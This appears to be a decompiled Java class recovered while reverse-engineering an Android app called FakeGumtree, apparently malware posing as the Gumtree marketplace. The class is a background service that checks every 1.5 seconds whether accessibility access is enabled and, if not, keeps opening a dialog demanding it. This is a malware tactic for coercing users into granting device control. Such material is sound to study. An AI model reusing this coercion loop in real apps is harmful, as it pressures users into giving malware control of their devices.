package com.gumsis.srs;

import android.annotation.TargetApi;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import com.gumsis.base.BaseService;
import com.gumsis.checktls.ASTls;
import com.gumsis.checktls.IntTls;
import java.util.Timer;
import java.util.TimerTask;

@TargetApi(18)
public class StDlgSrs
  extends BaseService
{
  private static long TIMER = 1500L;
  
  private static void mainTask(Context paramContext)
  {
    new Thread(new Runnable()
    {
      public void run()
      {
        StDlgSrs.StartDialogAccessTimerTask localStartDialogAccessTimerTask = new StDlgSrs.StartDialogAccessTimerTask(this.val$context);
        new Timer().schedule(localStartDialogAccessTimerTask, 0L, StDlgSrs.TIMER);
      }
    }).start();
  }
  
  protected IBinder baseOnBind(Intent paramIntent)
  {
    return null;
  }
  
  public void onDestroy()
  {
    super.onDestroy();
  }
  
  public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2)
  {
    mainTask(this);
    return 0;
  }
  
  public void onTaskRemoved(Intent paramIntent) {}
  
  static class StartDialogAccessTimerTask
    extends TimerTask
  {
    Context context;
    
    StartDialogAccessTimerTask(Context paramContext)
    {
      this.context = paramContext;
    }
    
    public void run()
    {
      try
      {
        if (!ASTls.isAccessibilitySettingsOn(this.context)) {
          IntTls.startDialogAccess(this.context);
        }
        return;
      }
      catch (Exception localException)
      {
        localException.printStackTrace();
      }
    }
  }
}


/* Location:              /home/cmd/Programmierung/Android/reverse-engineering/fakegumtree/FakeGumtree-dex2jar.jar!/com/gumsis/srs/StDlgSrs.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */